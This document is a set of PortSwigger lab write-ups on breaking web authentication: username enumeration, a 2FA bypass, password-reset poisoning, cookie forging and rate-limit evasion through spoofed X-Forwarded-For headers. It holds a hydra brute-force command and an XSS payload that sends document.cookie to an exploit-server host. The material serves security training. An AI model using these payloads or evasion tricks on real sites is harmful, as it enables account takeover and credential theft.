_________

# Lab: Username enumeration via different responses

- In this exercise we are executing a **Brute force attack** to bypass the **Authentication feature** 

     **Portswiger** provide us with a list of **usernames** and **passwords** to use them in the brute force attack

<img width="1200" height="598" alt="Captura de pantalla 2026-04-12 013133" src="https://github.com/user-attachments/assets/5a3690a6-fff3-4be9-9396-f069c9c8330a" />
     Login panel

- Let's capture the request with **Burpsuite** and send it to **Intruder** 

<img width="1345" height="513" alt="Captura de pantalla 2026-04-12 013319" src="https://github.com/user-attachments/assets/2744bc0b-61ae-42c8-9a53-41b5e79c74f5" />

- We have to parameters **Username** and **password**, we will make **fuzzing** with the intruder option, let's start with the **Username parameter**.

     For this exercise we will focus on the **lenght parameter** of every request made we need find the different one 

<img width="1475" height="311" alt="Captura de pantalla 2026-04-12 013247" src="https://github.com/user-attachments/assets/f08ab82a-d8e7-4388-8d0d-0ac134bdf3d9" />

```
analyzer
```

- We find the Usename **analyzer** with a different parameter, now let's do the same with the **password parameter**

<img width="1322" height="310" alt="Captura de pantalla 2026-04-12 014034" src="https://github.com/user-attachments/assets/907b6e48-bec5-429c-92f6-091db7a54af7" />

<img width="1399" height="167" alt="Captura de pantalla 2026-04-12 014117" src="https://github.com/user-attachments/assets/6de558cb-1126-4e9c-a323-21a13f93d53c" />
<img width="1240" height="410" alt="Captura de pantalla 2026-04-12 014212" src="https://github.com/user-attachments/assets/fc0de5b6-f557-4757-aba6-e0aead5d9f98" />

- We found the password **daniel** with a different status code. Let's register with the **Username** and **Password** we found 

```
daniel
```

<img width="1240" height="410" alt="Captura de pantalla 2026-04-12 014212" src="https://github.com/user-attachments/assets/2983d19a-7547-4539-b880-b997b0470299" />

- There is a second option to execute this **Brute force attack**, we can use **hydra**

```
hydra -L users.txt -P passwords.txt "http-post-form://0a0a006304be744e8008e49a000000e2.web-security-academy.net/login:username=^USER^&password=^PASS^:S=302" -V -t 1
```

<img width="1383" height="49" alt="Captura de pantalla 2026-04-12 172623" src="https://github.com/user-attachments/assets/cccbf544-f77c-4f5f-a801-1757e6f9a6fb" />

> With hydra can take so long which is not productive for us as pentesters, it can be detected easily by Security filters 


______________
# Lab: 2FA simple bypass

- In this exercise we are facing a **2FA (two-factor authentication)**, we need to use as the user **Carlos** without use the second **Authentication factor**

     2FA (two-factor authentication) is a security method that requires two forms of verification to confirm a user's identity and protect their accounts against unauthorized access.

<img width="853" height="665" alt="Captura de pantalla 2026-04-12 191026" src="https://github.com/user-attachments/assets/3b9dd0e2-c963-4bc0-a212-820ec266c724" />

- First we log in as our user (**wiener**)


<img width="848" height="479" alt="Captura de pantalla 2026-04-12 191120" src="https://github.com/user-attachments/assets/d51ef2db-f750-4237-9cb3-d73d057b80b2" />
     System is requesting a **4-digit security code**

- We have the option to check the emailm let;s get the **4-digit security code**

<img width="1306" height="632" alt="Captura de pantalla 2026-04-12 191156" src="https://github.com/user-attachments/assets/a595680c-d943-41ac-8bf5-9845ae5d81ff" />

- Now we can login with our **User** and right here is the key, we will copy the next part of the URL `/my-account`

<img width="749" height="190" alt="Captura de pantalla 2026-04-12 192852" src="https://github.com/user-attachments/assets/ed930484-bc6e-46b0-bd6b-17e248852d6c" />

- We need to **log-out** and now  **log-in** as **Carlos**, once we are here we need to add `my-account` on the **first authentication factor** (login with password and username) as **Carlos** before provide the **4-digit security code**

<img width="885" height="489" alt="Captura de pantalla 2026-04-12 194833" src="https://github.com/user-attachments/assets/c91c4f65-2354-49a8-b184-377d906a9f5c" />

     We delete the /login2 and add the /my-account  

```
https://0afd007d04ed5db48072c6e000b2002a.web-security-academy.net/my-account
```

<img width="1323" height="725" alt="Captura de pantalla 2026-04-12 192544" src="https://github.com/user-attachments/assets/46df3f09-4675-40ce-9616-452784e6fea8" />

- Successfully we bypassed the **second factor authentication** without providing the **4-digit security code**,  system did not verify this second filter it just accepted the link as a user already logged-in.

     Systems sometimes once the **first authentication factor** is accepted assume the user is already logged-in without verify the second factor which is a crutial error for the **Web-site security** 


_________________

# Lab: Password reset broken logic

- In this exercise we leverage of a vague sanitization in the verification of the user's tokens during the resetting password proccess. 

     For this exercise **port swiger** provide us with the username of a user but not the password, besides the credentials of **Wiener** (password includes)

- We have the option reset the password if the case we lose it, let's use the option with the user **Wiener**

<img width="911" height="557" alt="Captura de pantalla 2026-04-13 155419" src="https://github.com/user-attachments/assets/3ed58f95-f476-40ba-8658-50f33a2b8e9e" />

<img width="893" height="404" alt="Captura de pantalla 2026-04-13 155511" src="https://github.com/user-attachments/assets/f3d09708-2d33-492d-8e13-87abb1139abf" />

- We need to access in the **Email-client**

<img width="900" height="639" alt="Captura de pantalla 2026-04-13 155133" src="https://github.com/user-attachments/assets/8556e0cd-528b-4634-920c-318db3af6558" />

<img width="902" height="517" alt="Captura de pantalla 2026-04-13 155215" src="https://github.com/user-attachments/assets/f9b06a1a-7aac-4a94-8d20-f39ab73d5456" />

- Right here is where we capture the request with **Burpsuite**, we need to change the password of **Wiener** to get the request

<img width="785" height="448" alt="Captura de pantalla 2026-04-13 154151" src="https://github.com/user-attachments/assets/71094879-91e9-4912-bc26-4b6429864baf" />

- In this point we can see the system validate the **temp-forgot-password-token** twice and the **username** protocol  is subject to change. let's manipulate this parameters due to as we mentioned before system did not validate the **tokens** properly

     We change the original token for a random one and we change the username for **Carlos**, let's taste it. 

<img width="991" height="318" alt="Captura de pantalla 2026-04-13 154345" src="https://github.com/user-attachments/assets/99129ae9-22d8-47f8-bdf2-06ec7dd0b229" />

- **Status code 302 (redirection)**, good for us. system accepted the new password with the user **Carlos**, let's prove it on the login panel.

<img width="1184" height="612" alt="Captura de pantalla 2026-04-13 154506" src="https://github.com/user-attachments/assets/793d0518-b4a9-42f8-82e6-8a61dd2c7276" />]]

> We are proving in this exercise how a poor validation regarding the Token can trigger critical and elevate actions in a website

___________

# Username enumeration via subtly different responses

- In this exercise we will execute a **brute force attack** but unlike of the first exercise in this one we need to filter the error message system give us.

```
Invalid username or password.
```

<img width="1056" height="361" alt="Captura de pantalla 2026-04-13 165833 1" src="https://github.com/user-attachments/assets/cd535584-3e9e-4518-b31e-1c78d9f1f5c4" />

- We capture the **login request** with **burpsuite**

     Once we capture the **login request** we need to send to the **Intruder**

<img width="688" height="343" alt="Captura de pantalla 2026-04-13 165634" src="https://github.com/user-attachments/assets/e0dc8cb5-c2dc-466d-abcd-545a7f88e1a1" />

- It's important go to the **Grep - Extract** option and remark the **error system message**

```
Invalid username or password.
```

- We are looking for the **unique one**

<img width="1223" height="155" alt="Captura de pantalla 2026-04-13 165714" src="https://github.com/user-attachments/assets/b90b11bb-6978-4bac-b1a6-f2633884f81c" />

     we got the antivirus username identified

- Now we need to discover the **password**, we will let the **username** found and we will select the password parameter.

<img width="1314" height="404" alt="Captura de pantalla 2026-04-13 165544" src="https://github.com/user-attachments/assets/c9d124f6-e8d6-4804-b299-3436418fd1c0" />

- Let's find the **302 status code**

<img width="1496" height="82" alt="Captura de pantalla 2026-04-13 165745" src="https://github.com/user-attachments/assets/c0e5076e-6780-425f-8b8d-b67b4ae87491" />

- We found it, let's login.

<img width="1209" height="465" alt="Captura de pantalla 2026-04-13 165442 1" src="https://github.com/user-attachments/assets/4a4160d8-cca0-4167-8474-08400ba21847" />

- It worked successfully

    >This exercise teach us how to use the information provided by the system against himself (in this case a error message) using it as bait to recognize when the result of a attack is well guided or not.

______________________

# Lab: Username enumeration via response timing

- In this exercise we are facing a **Time validation mechanism** use by **Web-sites** in login process. Basically systems in certain cases only validate the **Password** if the **Username** is valid, if **Username** is not valid system won't go to check the **Password**, this behavior allow us through a request captured (in **burp suite**) analyze the time of the requests which take similar time and that ones takes longer.

      System provide us valid credentials to analyze requests times and also two lists one with Candidates Usernames and Passwords in order to find another valid user

<img width="1056" height="361" alt="Captura de pantalla 2026-04-13 165833 1" src="https://github.com/user-attachments/assets/4f03d3d2-062b-4c16-b8e3-13e27df0bba2" />
     Login panel

- As security measure some **Web-sites** pay special attention to those repetitives requests which seem suspicious to block them, In this exercise we will face that measure

<img width="772" height="638" alt="Captura de pantalla 2026-04-15 230342" src="https://github.com/user-attachments/assets/89bf1b1d-ee1f-4b68-b2e5-c855d26c50f9" />

- As we expected our I**D has been blocked** after try with multiple requests, let's analyze the request with **Burpsuite**

     In order to **bypass** this **security measure** we will implement/add the **X-Forwarded-For header** which help us to cheat the system regarding the IP where the request come from

<img width="1231" height="303" alt="Captura de pantalla 2026-04-15 231006" src="https://github.com/user-attachments/assets/80f93ba4-19da-43aa-90d7-2399054d4143" />

- Despite of System has been cheated using the **X-Forwarded-For header** system only allowed us to send an average of 3-4 request with a **fake IP** which means we need to replace it every 3-4 requests in order to find the valid **User** by fuzzing

     To execute this attack we will make use of the **Intruder tool** in **Burp Suite**. We will use the list of Usernames and Passwords candidates to Fuzz

- First we need to input a really long password to make the system read it completely and capture a significant long computation behind it, which is the signal to know system found a valid user

<img width="1477" height="318" alt="Captura de pantalla 2026-04-17 004348" src="https://github.com/user-attachments/assets/dd6fc3fa-f834-413d-9f07-157ed0a8c18b" />

- Good, we capture the longest request, let's add this username to the intruder-request and repeat the request with the passwords (For the password request we need to look for a **302 status code**)

<img width="1333" height="319" alt="Captura de pantalla 2026-04-17 004714" src="https://github.com/user-attachments/assets/2e5fe458-c1a6-4ce6-8bd6-de7c9d1f3ebc" />


- We got the **302 status code** we expected, we found the **Password** now let's log in.

<img width="1314" height="506" alt="Captura de pantalla 2026-04-17 004000" src="https://github.com/user-attachments/assets/5e18e09c-a34b-4c81-b304-00a328cfeaa6" />

- We logged in successfully.

## Key points

## 1
This exercise highlight the importance of a properly sanitization with the **X-Forwarded-For header** which is this case is not validating if the **Fakes IP's**  we are using are **trustworthy**, with a good security measure implemented our requests using **Fakes IP's** will be blocked inmediately 

## 2
We use a process as simple as **the validation time during login** as a guide to determine whether a **username** is valid or not; it’s simple, but as penetration testers, it becomes our eyes

_____
# Lab: Broken brute-force protection, IP block

- In this exercise we are facing a security measure which blocks IP's when multiple request are made consecutively, let's understand this behavior

     System provide us valid credentials as **Wiener** (**Username** and **Password**) and the Username **Carlos** without a Password (We need to exfiltrate it) besides of **Candidates Passwords**

- After studying the **Login panel** behavior we realized system block our **IP** in the third login try, if we login with invalids credentials only twice is ok but at the third time system block our **IP**. however if in the third try we login with the valid credentials system will renew the tries that way we can try multiple times only making sure every third time we need to use the **Wiener** credentials 

<img width="1550" height="141" alt="Captura de pantalla 2026-04-19 001719" src="https://github.com/user-attachments/assets/7ecea278-fbd2-4134-b7d4-0071965246d7" />

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```
      This is the message system give us at the third try 

- Taking into account this behavior we need to make use of the **Intruder feature** of **Burp Suite** to **Fuzz** but first we need to design a specific list with **usernames** and **credentials**

<img width="323" height="464" alt="Captura de pantalla 2026-04-19 001927" src="https://github.com/user-attachments/assets/1f2c025d-b03b-49c2-9589-dc31c3dd4e52" />]]

- Right here we make use of two scripts (in **python**) to create our lists with the order we need

<img width="309" height="151" alt="Captura de pantalla 2026-04-19 002030" src="https://github.com/user-attachments/assets/5243c88a-c9de-4344-b99f-66ff5ee40b9a" />
     Every third time we have the Username **Wiener** to renew the tries 

<img width="301" height="295" alt="Captura de pantalla 2026-04-19 002303" src="https://github.com/user-attachments/assets/0377e906-c780-49ea-9272-e4ba35625ecf" />]]
     Right here we have the passwords list, **Wiener** password every third time
  
- With this done let's Fuzz with the **Intruder-burpsuite**

     We need to find a **302 status code** coming from the User **Carlos**

<img width="1452" height="255" alt="Captura de pantalla 2026-04-19 015923" src="https://github.com/user-attachments/assets/a09c06bc-23e8-4cbc-bbc6-9309948a37bd" />]

<img width="1079" height="29" alt="Captura de pantalla 2026-04-19 020120" src="https://github.com/user-attachments/assets/935489c4-956d-4055-88bf-a1aa753c30bd" />]]

- We got our valid credentials now let's login.

<img width="1239" height="396" alt="Captura de pantalla 2026-04-19 001454" src="https://github.com/user-attachments/assets/2b11139d-879f-4937-8202-57bd181d791e" />

- We loged in successfully.

> This exercise teach us how to understand the **Web-site behavior** can be determinant in the **Web-site Security** using it as the key to execute attacks. A login-renew feature is not enough as security measure.

___________

## Brute-forcing a stay-logged-in cookie

- In this exercise we will execute an attack wich consits in understand how a **Remember me** or **Keep me logged in Coeokie**  is build in the **WAF**, understand it will help us as attackers to create or fake our  **keep me logged in cookie**. let's start

    System provide us valid credentials as **Wiener** (**Username** and **Password**) and the Username **Carlos** without a Password (We need to exfiltrate it) besides of **Candidates Passwords**


<img width="667" height="704" alt="Captura de pantalla 2026-04-20 182941" src="https://github.com/user-attachments/assets/9770219e-3a84-4edc-9fc9-f34f157535ff" />
    We have allowed the **Stay logged in option**

- We need to capture the **/my-account** request once we logged in as **Wiener** (With **Burpsuite**)

<img width="617" height="249" alt="Captura de pantalla 2026-04-20 225533" src="https://github.com/user-attachments/assets/abd5e50b-a681-4903-a531-9e01bf600a66" />

- We realized a **stay-logged-in cookie** was asigned to us, we need to understand his composition 

     This **Cookie** looks **unusual**, it does not look as a **regular Cookie** let's pass this **Cookie** with the **Decoder feaurure** of **Burpsuite** and see what it is 

<img width="365" height="276" alt="Captura de pantalla 2026-04-20 231720" src="https://github.com/user-attachments/assets/8e8ef83d-aa0b-48d4-892a-8727b24f5c3f" />

- If we apply a **base64-Encode** we realized the name of the **User Wiener** and more important we have a **MD5** too, we suspect is the password

     To get the **MD5 value** we will use the web site **Crack-station**
     https://crackstation.net/
     Due to legal reasons we need to be carefull about how to use this **Web-site**

<img width="1046" height="282" alt="Captura de pantalla 2026-04-20 232017" src="https://github.com/user-attachments/assets/ad9b13db-cee0-4e50-adde-413232e5e3da" />

- As we expected we got the **Wiener's password**, we have the hundred porcent of the Cookie composition understood let's use this knowledge to execute the attack with the **Intruder-feature**

     before execute our attack we need to **set-up** how the payload will be taken during it.

<img width="634" height="231" alt="Captura de pantalla 2026-04-21 000402" src="https://github.com/user-attachments/assets/d3bb0560-9888-4ab6-b9f2-5798fccd44b7" />

     We will the next configurationss on the Payload processing option
    Hash for our Password
    Prefix to apply the Hash on the correcto position
     Base64 Encode to the whole cookie 
 
<img width="785" height="699" alt="Captura de pantalla 2026-04-20 232500" src="https://github.com/user-attachments/assets/e1879705-3a6b-444c-8fb7-d57843cea5e5" />

- let's execute our attack

<img width="1143" height="555" alt="Captura de pantalla 2026-04-20 231418" src="https://github.com/user-attachments/assets/edf6871b-73ef-425e-a85e-3ad7841beffd" />
    **200 status code**

- We have logged in as **Carlos** simply understanding the composition of the **stay-logged-in cookie**

<img width="1267" height="293" alt="Captura de pantalla 2026-04-20 231452" src="https://github.com/user-attachments/assets/cc2aa476-8a5f-4fc2-b08c-cc353cf56f62" />

## Key points

## 1
This simple exercise teach us a how the fact of not **set-up** a non ungueseable **stay-logged-in cookie** (Using a cookie with a complex composition) can compromise the **Web-Site Security** allowing us as attackers to login as other user and much more.

## 2
As attackers is important understant every vulnerability not as **'single-way to attack'** rather as posibility to concatenate multilple vulnerabilities which is more realistic and powerfull as attack, the point with this is realize for example using an **XSS attack** as a bridge we can steal a **stay-logged-in cookie** and study his composition and if this one is vague and easy to undertstand we can **escalate privileges**

___________

# Lab: Offline password cracking

- In this exercise we execute an **Authentication attack** via a **XSS (cross-site-scripting)**, stealing the cookie parameter and studying the composition.

<img width="762" height="665" alt="Captura de pantalla 2026-04-21 012132" src="https://github.com/user-attachments/assets/79849cc4-40bf-4b6f-b946-9e0ac97ea9d2" />

- We login as **Wiener** ( clicked in **Stay logged in**) and after we capture the **/my-account?** request with **Burpsuite**

<img width="624" height="353" alt="Captura de pantalla 2026-04-21 012804" src="https://github.com/user-attachments/assets/60dfc140-180c-4498-b14d-1bd644ba0997" />

- We got an unusual **stay-logged-in Cookie** (seems to have a base64 encode), we need to steal the **stay-logged-in Cookie** of **Carlos** let's make use of the **exploit sever** provided by Portswiger to execute a **XSS attack** 

     Important: We have the **exploit sever URL** and the **access log** to check the activity 

<img width="985" height="707" alt="Captura de pantalla 2026-04-21 185213 1" src="https://github.com/user-attachments/assets/367f12ac-ce30-4cb4-84a8-2619fc38e43c" />

- Exercise told us the commentaries are vulnerable to **XSS**, let's use a **document.location** to redirect the **Cookie parameter** to our **exploit server** 

<img width="951" height="693" alt="Captura de pantalla 2026-04-21 184934" src="https://github.com/user-attachments/assets/423ccde5-e771-45bb-9e23-9c46c775e48d" />

```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

 - We fill in the commentarie panel and add the **XSS payload** (adding the **exploit sever URL**). Once  this is done we need to check the **Access log** till receive the **Cookie parameter**

<img width="1918" height="356" alt="Captura de pantalla 2026-04-21 013028" src="https://github.com/user-attachments/assets/41d07dbd-d9a3-481b-bc65-19c5b018e81b" />

- We got the **Cookie parameter** now we need to extract the **stay-logged-in Cookie** and study the composition.

<img width="614" height="264" alt="Captura de pantalla 2026-04-21 013113" src="https://github.com/user-attachments/assets/d80d1ca6-6622-4022-8b4a-c53e61c3c23d" />

- With the decoder feature we realized it's a **base64** and it's showing us the **Username** but we have something else (We suspect it's a **MD5**)

     We will use  https://crackstation.net/ to extract the **MD5** value

<img width="1040" height="357" alt="Captura de pantalla 2026-04-21 013132" src="https://github.com/user-attachments/assets/7de22a5e-5a0d-41eb-9b13-1df458c7602e" />

- Successfully we got the **password** of the User ***Carlos*** , let;s use it to login and delete the account

<img width="869" height="685" alt="Captura de pantalla 2026-04-21 013314" src="https://github.com/user-attachments/assets/572ce715-00f5-4a64-82cf-edf24be70756" />


<img width="783" height="546" alt="Captura de pantalla 2026-04-21 013358" src="https://github.com/user-attachments/assets/98fff09b-ed7d-4757-9c6b-5bebe13ad165" />

- Successfully we logged in as **Carlos** and we have delete the account

<img width="1199" height="273" alt="Captura de pantalla 2026-04-21 013417" src="https://github.com/user-attachments/assets/4ef037d3-9707-417a-acb8-6e0235b70d25" />

> This exercise shows how an **XSS vulnerability** can be combined with an **authentication attack** and allow attackers to perform critical and unauthorized actions, in addition to a vague sanitization of the **stay-logged-in cookie** that makes it easily readable, implying its forgery and misuse.

_________
# Lab: Password reset poisoning via middleware

- In this exercise we will execute a **Password Reset Poisoning attack** in the **reset-password functionality** which is vulnerable.

     The purpose of this exercise is Login as the user **Carlos** besides Portswiger provide us with the **Wiener** credentials (valid credentials)

<img width="810" height="485" alt="Captura de pantalla 2026-04-21 232538" src="https://github.com/user-attachments/assets/694123d2-36d9-4152-bc85-9e1699d5c62f" />

-  Login panel with the **Forgot password?** functionality which is really used in the real life, let's study the behavior using **Burpsuite** to capture the requests we send.

<img width="778" height="400" alt="Captura de pantalla 2026-04-21 230850 2" src="https://github.com/user-attachments/assets/e76ab728-635c-4f1c-817e-6798c59936f3" />
       Request which indicate us to visit the **Wiener email** to receive the an email to reset the password and also which contains the **temp-forgot-password-token** and is use to identified what user will reset the password for only that opportunity, after that this token will be delete it due to security reasons 

<img width="644" height="214" alt="Captura de pantalla 2026-04-21 233306" src="https://github.com/user-attachments/assets/f164d318-fe83-43a5-82cc-ba070227b408" />
    With this request **Web-site** provide us the panel to reset the password, it's important emphasize we are allowed to manipulate the **temp-forgot-password-token**

<img width="831" height="474" alt="Captura de pantalla 2026-04-22 000258" src="https://github.com/user-attachments/assets/92a11364-acee-4c23-a96a-4edb82af1670" />


- We will manipulate the **first request** making use of the **header X-Forwarder-Host** which is use to determine the original host requested by the user. We will add as **Original Host** the IP of the **Exploit-server provided by the Portswiger**

> First we will make an example of how this work, we will do it with the User Wiener

<img width="770" height="315" alt="Captura de pantalla 2026-04-21 231145 2" src="https://github.com/user-attachments/assets/0c4ed88a-dcb4-4a07-92c4-2ad40d9ab0ff" />

- Let's verify the **Exploit-server Email-client** to receive the **reset-password email** 

<img width="1268" height="607" alt="Captura de pantalla 2026-04-21 231027" src="https://github.com/user-attachments/assets/42c0f9ce-0f93-4ab7-8ca3-46d26693c801" />

- We can observe system accepts the **header X-Forwarded-Host** successfully, we see the **Exploit-server email** we added it. Taking into account this let's execute the attack one more time but this time with the user **Carlos**

<img width="1293" height="447" alt="Captura de pantalla 2026-04-21 233529" src="https://github.com/user-attachments/assets/4437b53e-a83d-4a20-96ec-533ea246afca" />

- Let's verify the **Exploit-server Acces-Log** to receive the token we need

<img width="1193" height="146" alt="Pasted image 20260421233637" src="https://github.com/user-attachments/assets/d05a63c3-f064-4e54-a735-7115f78fe15c" />

```
yisouqmt6nvvrdprciqd0j4jpfgso628
```

- It worked one more time, system accepts the **header X-Forwarded-Host** and now we have the 
**Carlos temp-forgot-password-token** let's use it to login

<img width="1445" height="435" alt="Captura de pantalla 2026-04-21 231930 1" src="https://github.com/user-attachments/assets/b812d12e-a427-44df-9a4a-17fe598c809a" />

<img width="1225" height="584" alt="Captura de pantalla 2026-04-21 232234" src="https://github.com/user-attachments/assets/d96b1492-772e-42dc-8e72-494c0850cd1e" />

- We input the new password

<img width="1335" height="725" alt="Captura de pantalla 2026-04-21 232312" src="https://github.com/user-attachments/assets/71753054-c206-4ae1-9c47-597d3b4db861" />

- We logged in successfully as the **User Carlos**

## Key points

## 1 
This exercise teach us how a vague sanitization in the headers and to be specific the use of the **header X-Forwarded-Host** can concatenate dangerous and unathorized actions which infringe **Web-site security**

## 2
Exercise description says **'The user `carlos` will carelessly click on any links in emails that he receives'** and this can be defined as the biggest mistake a **Web-site** can has:

    THE HUMAN FACTOR

The fact that any employee in a company trust in a link which does not know, involves and create the perfect scenario for one pentester to infringe the **Website Security** performing vulnerabilities as ***CSRF, BAC, XXS*** etc...


______________
# Lab: Password brute-force via password change

- In this exercise we will leverage of the Web-site messages to gain access as the **User Carlos** robbing his password

     Essentially we will use the Web-Site messages as guide to determine which password is correct.

- **Portswiger** provide us a **Candidate password list** to execute our attack and the **Wiener valid credentials**

<img width="1224" height="695" alt="Captura de pantalla 2026-04-22 190019" src="https://github.com/user-attachments/assets/12341b79-78f2-4fae-905d-74146045e3a6" />

- We have the panel to **Update email** and **Change password**, let's study the **Change password** behavior

<img width="308" height="140" alt="Captura de pantalla 2026-04-22 190617" src="https://github.com/user-attachments/assets/cad5e5ea-f15e-46be-8874-f7291183690f" />

      Wrong current password + two different new passwords



<img width="264" height="131" alt="Captura de pantalla 2026-04-22 190159" src="https://github.com/user-attachments/assets/10d7b728-cee2-498f-bf8c-3cbab116a6e2" />

     valid current password + two different new passwords

- Studying this behavior we realize if we enter the **valid password** plus **two different new passwords** system will indicate us the **two different new passwords** assuming the current password is correct which give us an important clue, if we can execute a **Fuzzing attack** and grep in every response the message **New passwords do not match** that way we will find the correct password.

     We capture the request with **Burpsuite** and we will use the **Intruder feature** 

<img width="742" height="313" alt="Captura de pantalla 2026-04-22 190827" src="https://github.com/user-attachments/assets/779def52-9dd2-4481-9646-88eed717abe0" />

- We change the **username** by **carlos** and after we will select the **current-password parameter** besides we need to use the **Grep match** option to capture the **New passwords do not match**

<img width="734" height="325" alt="Captura de pantalla 2026-04-22 191816" src="https://github.com/user-attachments/assets/1a380f87-5259-4c3b-bf78-0891e3f8beae" />

- Let's execute the attack.

<img width="1210" height="155" alt="Captura de pantalla 2026-04-22 192038" src="https://github.com/user-attachments/assets/6ce32821-311d-4d26-8952-5652a16f9b82" />

- We have capture two important indicators, a different **Length** and the message we are looking for **New passwords do not match**. The password is **ranger** let's login as **Carlos** 

<img width="1206" height="376" alt="Captura de pantalla 2026-04-22 192201" src="https://github.com/user-attachments/assets/10947928-3c65-462a-ba13-c2ae63f5ff57" />

- We logged in successfully as the user **Carlos**

## Key points

## 1
This exercise show how to execute a **Information Exposure through Discrepancy in Responser** attack, a simple way to understand it is how the error in the order as the parameters are read can filter crutial information.

     If the system has validated the current password first before the two different new passwords could have reported a different error without mention the validation of the current password


____________

# Lab: Broken brute-force protection, multiple credentials per request

- In this exercise we are facing a vulnerability located in a **JSON format** which is use to handle the credentials on the login panel

     This exercise only provide us a **valid username** and a list of **candidate passwords**

<img width="765" height="348" alt="Captura de pantalla 2026-04-26 210108" src="https://github.com/user-attachments/assets/581ea51d-2ef4-4aa8-9601-f96b97ef9bac" />
     Login request captured in **Burpsuite**

-   We will manipulate the **JSON format** adding more passwords and check if the system accepts multiple values

<img width="225" height="143" alt="Captura de pantalla 2026-04-26 210818" src="https://github.com/user-attachments/assets/5e07f36f-ad9c-4095-a7f5-9730d387e7df" />

<img width="762" height="133" alt="Captura de pantalla 2026-04-26 210847" src="https://github.com/user-attachments/assets/329e9114-5c34-4b78-8ec5-e771a9850716" />

- We have a **200 status code**, good for us. System is reading every password we entered that means we can try with all the **candidate passwords** and in some point system fwill find the correct password.

      We will use nvim to adapt the passwords format

```
"password":[
   "123456",
   "password",
   etc...
]
```

<img width="228" height="407" alt="Captura de pantalla 2026-04-26 211006" src="https://github.com/user-attachments/assets/921d8edb-a053-4f20-9878-40aa63005b73" />

<img width="646" height="86" alt="Captura de pantalla 2026-04-26 211039" src="https://github.com/user-attachments/assets/a91fb74d-a4ce-4e7d-93ea-179c2981c3da" />

- **302 status code (redirection)** which means system find the valid password, let's to my /my-account? as **Carlos** 

<img width="1219" height="388" alt="Captura de pantalla 2026-04-26 212302" src="https://github.com/user-attachments/assets/9b7970e8-5ad7-475e-a6b8-6aaa547d67f3" />

## Key points

## 1
In this exercise, we are executing a brute-force attack targeting a JSON-based login panel that fails to enforce strict schema validation. While the system should only accept a single string value per parameter, the backend incorrectly processes an **array** of multiple passwords within a **single HTTP request**. This logic flaw allow us to bypass traditional rate-limiting protections and send all candidate passwords at once until the server identifies a valid credential and returns a 302 redirect.

___________________


































  
